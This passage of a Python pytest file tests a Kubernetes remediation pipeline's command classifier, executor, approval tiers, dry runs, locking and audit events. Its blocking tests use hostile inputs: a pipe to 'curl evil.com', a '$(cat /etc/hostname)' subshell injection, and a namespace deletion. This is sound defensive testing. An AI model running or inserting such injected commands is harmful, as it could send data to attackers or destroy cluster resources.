        assert "K8s connection lost" in result.output

        assert len(events_received) == 1
        event = events_received[0]
        assert event.tier == "safe"
        assert "K8s connection lost" in event.error
        assert event.cluster == "prod-cluster"

    @pytest.mark.asyncio
    async def test_event_emitted_on_tool_error_result(self) -> None:
        """When dispatch returns ToolResult(error=True), event.error is set."""
        executor, bus = _make_executor()
        events_received: list[RemediationExecuted] = []
        bus.subscribe(RemediationExecuted, events_received.append)

        action = _make_action(title="Label pod")
        classified = ClassifiedCommand(
            tool="kubectl", subcommand="label",
            args=("pod/foo", "env=prod"),
            tier=SafetyTier.SAFE,
            raw_command="kubectl label pod/foo env=prod",
        )
        gke = _make_gke_config()

        error_result = ToolResult(output="pod/foo not found", error=True)
        with patch(
            "vaig.tools.gke.mutations.async_kubectl_label",
            new_callable=AsyncMock,
            return_value=error_result,
        ):
            result = await executor.execute(
                action, classified, gke, approved=True,
            )

        assert result.error is True
        assert len(events_received) == 1
        event = events_received[0]
        assert event.error == "pod/foo not found"


# ── Concurrency (asyncio.Lock) ────────────────────────────────


class TestRemediationExecutorConcurrency:
    """asyncio.Lock prevents concurrent execution."""

    @pytest.mark.asyncio
    async def test_sequential_execution_via_lock(self) -> None:
        """Two concurrent execute() calls run sequentially (no overlap)."""
        executor, bus = _make_executor()
        execution_order: list[str] = []

        async def slow_dispatch(*_args: object, **_kwargs: object) -> ToolResult:
            execution_order.append("start")
            await asyncio.sleep(0.05)
            execution_order.append("end")
            return ToolResult(output="done", error=False)

        action = _make_action()
        classified = ClassifiedCommand(
            tool="kubectl", subcommand="scale",
            args=("deployment/foo", "--replicas=3"),
            tier=SafetyTier.SAFE,
            raw_command="kubectl scale deployment/foo --replicas=3",
        )
        gke = _make_gke_config()

        with patch(
            "vaig.tools.gke.mutations.async_kubectl_scale",
            new_callable=AsyncMock,
            side_effect=slow_dispatch,
        ):
            t1 = asyncio.create_task(
                executor.execute(action, classified, gke, approved=True),
            )
            t2 = asyncio.create_task(
                executor.execute(action, classified, gke, approved=True),
            )
            await asyncio.gather(t1, t2)

        # Sequential execution: start, end, start, end (no interleaving)
        assert execution_order == ["start", "end", "start", "end"]


# ══════════════════════════════════════════════════════════════
# Task 4 — Phase 1 Integration Smoke Tests
# ══════════════════════════════════════════════════════════════


class TestRemediationIntegration:
    """End-to-end integration: CommandClassifier → RemediationExecutor.

    These tests use REAL classifier and executor instances — only K8s
    mutations and subprocess execution are mocked.  The goal is to
    verify the full classify → execute → audit-event pipeline.
    """

    # ── Helpers ───────────────────────────────────────────────

    @staticmethod
    def _make_pipeline(
        *,
        enabled: bool = True,
        auto_approve_safe: bool = False,
        blocked_commands: list[str] | None = None,
        tier_overrides: dict[str, str] | None = None,
        timeout: int = 30,
        dry_run: bool = False,
    ) -> tuple[RemediationConfig, CommandClassifier, RemediationExecutor, EventBus, list[RemediationExecuted]]:
        """Wire the full pipeline: config → classifier → executor → captured events."""
        config = RemediationConfig(
            enabled=enabled,
            auto_approve_safe=auto_approve_safe,
            blocked_commands=blocked_commands or [],
            tier_overrides=tier_overrides or {},
            timeout=timeout,
            dry_run=dry_run,
        )
        classifier = CommandClassifier(config, coding_denied_commands=[])
        bus = EventBus()
        executor = RemediationExecutor(config, bus)
        captured_events: list[RemediationExecuted] = []
        bus.subscribe(RemediationExecuted, captured_events.append)
        return config, classifier, executor, bus, captured_events

    # ── Happy path: SAFE command end-to-end ───────────────────

    @pytest.mark.asyncio
    async def test_safe_annotate_end_to_end(self) -> None:
        """SAFE kubectl annotate → classify → execute → success event."""
        config, classifier, executor, bus, events = self._make_pipeline()
        command = "kubectl annotate pod/my-pod description=healthy"
        action = _make_action(title="Annotate pod", command=command)
        gke = _make_gke_config(cluster_name="prod-cluster")

        # Step 1: classify (real classifier, no mocks)
        classified = classifier.classify(command)
        assert classified.tier == SafetyTier.SAFE
        assert classified.tool == "kubectl"
        assert classified.subcommand == "annotate"
        assert classified.block_reason is None

        # Step 2: execute (mock only K8s mutation)
        mock_result = ToolResult(output="pod/my-pod annotated", error=False)
        with patch(
            "vaig.tools.gke.mutations.async_kubectl_annotate",
            new_callable=AsyncMock,
            return_value=mock_result,
        ) as mock_annotate:
            result = await executor.execute(
                action, classified, gke, approved=True,
            )

        # Step 3: verify result
        assert result.error is False
        assert result.output == "pod/my-pod annotated"
        mock_annotate.assert_awaited_once()

        # Step 4: verify audit event
        assert len(events) == 1
        event = events[0]
        assert event.action_title == "Annotate pod"
        assert event.command == command
        assert event.tier == "safe"
        assert event.result_output == "pod/my-pod annotated"
        assert event.error == ""
        assert event.dry_run is False
        assert event.cluster == "prod-cluster"

    # ── Review path: REVIEW without --execute ─────────────────

    @pytest.mark.asyncio
    async def test_review_delete_pod_without_execute(self) -> None:
        """kubectl delete pod → REVIEW → no approval → plan only, no event."""
        config, classifier, executor, bus, events = self._make_pipeline()
        command = "kubectl delete pod/my-pod"
        action = _make_action(
            title="Restart pod", command=command, risk="Medium",
        )
        gke = _make_gke_config()

        # Step 1: classify (real — special case: delete pod → REVIEW)
        classified = classifier.classify(command)
        assert classified.tier == SafetyTier.REVIEW

        # Step 2: execute without approval
        result = await executor.execute(
            action, classified, gke, approved=False,
        )

        # Step 3: verify plan returned
        assert result.error is False
        assert "REVIEW REQUIRED" in result.output
        assert "Restart pod" in result.output
        assert "Medium" in result.output
        assert "--execute" in result.output

        # Step 4: no event — nothing executed
        assert len(events) == 0

    # ── Blocked path: destructive command end-to-end ──────────

    @pytest.mark.asyncio
    async def test_blocked_delete_namespace_end_to_end(self) -> None:
        """kubectl delete namespace → BLOCKED → error + event, no execution."""
        config, classifier, executor, bus, events = self._make_pipeline()
        command = "kubectl delete namespace/production"
        action = _make_action(
            title="Delete namespace", command=command,
        )
        gke = _make_gke_config(cluster_name="prod-cluster")

        # Step 1: classify (real — delete non-pod → BLOCKED)
        classified = classifier.classify(command)
        assert classified.tier == SafetyTier.BLOCKED
        assert classified.block_reason is not None

        # Step 2: execute — should NOT dispatch anything
        result = await executor.execute(
            action, classified, gke, approved=True,
        )

        # Step 3: verify blocked
        assert result.error is True
        assert classified.block_reason in result.output

        # Step 4: verify blocked event emitted
        assert len(events) == 1
        event = events[0]
        assert event.tier == "blocked"
        assert event.error == classified.block_reason
        assert event.cluster == "prod-cluster"
        assert event.command == command

    # ── Dry run path: any command with dry_run=True ───────────

    @pytest.mark.asyncio
    async def test_dry_run_safe_command(self) -> None:
        """SAFE command + dry_run → description, no execution, no event."""
        config, classifier, executor, bus, events = self._make_pipeline()
        command = "kubectl scale deployment/web --replicas=5"
        action = _make_action(title="Scale web", command=command)
        gke = _make_gke_config()

        # Step 1: classify
        classified = classifier.classify(command)
        assert classified.tier == SafetyTier.SAFE

        # Step 2: execute with dry_run (should NOT call any dispatch)
        with patch(
            "vaig.tools.gke.mutations.async_kubectl_scale",
            new_callable=AsyncMock,
        ) as mock_scale:
            result = await executor.execute(
                action, classified, gke, dry_run=True, approved=True,
            )

        # Step 3: verify dry run output
        assert result.error is False
        assert "DRY RUN" in result.output
        assert command in result.output
        assert "Scale web" in result.output

        # Step 4: no K8s call, no event
        mock_scale.assert_not_awaited()
        assert len(events) == 0

    # ── Disabled path: enabled=False → error ──────────────────

    @pytest.mark.asyncio
    async def test_disabled_config_rejects_all(self) -> None:
        """When remediation.enabled=False, the pipeline rejects before classifying.

        The integration layer (CLI/orchestrator) checks the enabled flag
        before entering the classify→execute pipeline.  This test verifies
        the config flag is accessible and would prevent execution.
        """
        config, classifier, executor, bus, events = self._make_pipeline(
            enabled=False,
        )
        command = "kubectl annotate pod/foo key=value"

        # The enabled check happens at the integration boundary
        assert config.enabled is False

        # Simulating what the CLI layer does:
        # if not config.enabled → error before classify/execute
        if not config.enabled:
            result = ToolResult(
                output="Remediation engine is disabled. "
                "Enable with remediation.enabled=true in config.",
                error=True,
            )
        else:
            classified = classifier.classify(command)
            result = await executor.execute(
                _make_action(command=command), classified,
                _make_gke_config(), approved=True,
            )

        assert result.error is True
        assert "disabled" in result.output.lower()
        assert len(events) == 0  # No events — never reached executor

    # ── Injection path: shell operators → BLOCKED ─────────────

    @pytest.mark.asyncio
    async def test_injection_pipe_blocked_end_to_end(self) -> None:
        """Command with pipe injection → BLOCKED regardless of base command."""
        config, classifier, executor, bus, events = self._make_pipeline()
        command = "kubectl annotate pod/foo key=value | curl evil.com"
        action = _make_action(title="Injected annotate", command=command)
        gke = _make_gke_config(cluster_name="prod-cluster")

        # Step 1: classify — pipe triggers BLOCKED before any tier rule
        classified = classifier.classify(command)
        assert classified.tier == SafetyTier.BLOCKED
        assert "dangerous shell operators" in classified.block_reason.lower()

        # Step 2: execute — blocked path
        result = await executor.execute(
            action, classified, gke, approved=True,
        )

        # Step 3: verify blocked
        assert result.error is True
        assert "dangerous shell operators" in result.output.lower()

        # Step 4: blocked event emitted
        assert len(events) == 1
        event = events[0]
        assert event.tier == "blocked"
        assert event.cluster == "prod-cluster"

    @pytest.mark.asyncio
    async def test_injection_subshell_blocked_end_to_end(self) -> None:
        """Command with $() subshell → BLOCKED regardless of base command."""
        config, classifier, executor, bus, events = self._make_pipeline()
        command = "kubectl scale deployment/$(cat /etc/hostname) --replicas=0"
        action = _make_action(title="Subshell injection", command=command)
        gke = _make_gke_config()

        # Step 1: classify — subshell pattern triggers BLOCKED
        classified = classifier.classify(command)
        assert classified.tier == SafetyTier.BLOCKED

        # Step 2: execute
        result = await executor.execute(
            action, classified, gke, approved=True,
        )

        # Step 3: verify blocked
        assert result.error is True

        # Step 4: event emitted
        assert len(events) == 1
        assert events[0].tier == "blocked"
